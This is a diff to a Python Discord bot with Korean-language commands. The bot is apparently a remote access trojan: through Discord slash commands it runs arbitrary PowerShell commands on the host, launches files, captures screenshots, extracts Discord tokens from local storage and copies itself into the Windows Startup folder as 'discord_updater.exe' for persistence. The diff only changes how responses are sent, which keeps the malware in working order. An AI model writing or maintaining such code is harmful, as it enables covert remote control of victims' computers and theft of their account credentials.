@@ -4,6 +4,7 @@ import os
 import re
 import shutil
 import sys
+import asyncio
 
 from discord import Bot, Embed, ApplicationContext, Option, File
 import pyautogui
@@ -90,33 +91,45 @@ async def on_ready():
 
 @bot.slash_command(name="help", description="명령어 목록을 보여줍니다.", guild_ids=[guild_id])
 async def show_help(context: ApplicationContext):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     embed = Embed(title="명령어 목록", description=f"```{commands}```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="cd", descripton="폴더를 변경합니다.", guild_ids=[guild_id])
 async def change_directory(context: ApplicationContext, directory: Option(str, name="폴더명", description="이동할 폴더명")):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     try:
         os.chdir(directory)
         embed = Embed(title="디렉토리 변경됨", description=f"```{os.getcwd()}```", color=0x1ABC9C)
     except OSError:
         embed = Embed(title="실패", description=f"```디렉토리 변경을 실패했습니다.```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="ls", description="현재 폴더의 파일들과 폴더들을 보여줍니다.", guild_ids=[guild_id])
 async def execute_ls(context: ApplicationContext):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     files = "\n".join(os.listdir())
 
     if not files:
         files = "디렉토리가 비여있습니다."
 
     embed = Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="shell", description="명령어를 실행합니다.", guild_ids=[guild_id])
 async def execute_command(context: ApplicationContext, command=Option(str, name="명령어", description="실행할 명령어")):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     output = subprocess.Popen(
         ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
         shell=True
@@ -126,15 +139,18 @@ async def execute_command(context: ApplicationContext, command=Option(str, name=
         output = "결과가 출력되지 않았습니다."
 
     embed = Embed(title=f"쉘 접속됨 > {os.getcwd()}", description=f"```{output}```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="run", description="파일을 실행합니다", guild_ids=[guild_id])
 async def run_file(context: ApplicationContext, file=Option(str, name="파일명", description="실행할 파일명")):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     subprocess.Popen(cast(file, str), shell=True)
 
     embed = Embed(title="파일 실행 완료", description=f"```{file}```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="exit", description="봇을 종료합니다", guild_ids=[guild_id])
@@ -145,17 +161,23 @@ async def close_bot(context: ApplicationContext):
 
 @bot.slash_command(name="screenshot", description="스크린샷을 찍습니다", guild_ids=[guild_id])
 async def take_screenshot(context: ApplicationContext):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     screenshot = pyautogui.screenshot()
     path = os.path.join(os.getenv("TEMP"), "screenshot.png")
     screenshot.save(path)
     file = File(path)
     embed = Embed(title="스크린샷 촬영 완료", color=0x1ABC9C)
     embed.set_image(url="attachment://screenshot.png")
-    await context.respond(embed=embed, file=file)
+    await context.followup.send(embed=embed, file=file)
 
 
 @bot.slash_command(name="token", description="디스코드 토큰을 찾습니다", guild_ids=[guild_id])
 async def find_token(context: ApplicationContext):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     paths = [
         os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
         os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
@@ -193,11 +215,14 @@ async def find_token(context: ApplicationContext):
         result_tokens = "디스코드 토큰을 찾지 못했습니다."
 
     embed = Embed(title="토큰", description=f"```{result_tokens}```", color=0x1ABC9C)
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="startup", description="시작프로그램을 등록합니다", guild_ids=[guild_id])
 async def register_startup_program(context: ApplicationContext):
+    await context.response.defer()
+    await asyncio.sleep(0)
+
     path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     try:
         shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
@@ -206,7 +231,7 @@ async def register_startup_program(context: ApplicationContext):
     except shutil.Error:
         embed = Embed(title="오류", description=f"```시작프로그램 등록을 실패했습니다.```", color=0x1ABC9C)
 
-    await context.respond(embed=embed)
+    await context.followup.send(embed=embed)
 
 
 @bot.slash_command(name="shutdown", description="컴퓨터를 종료합니다.", guild_ids=[guild_id])
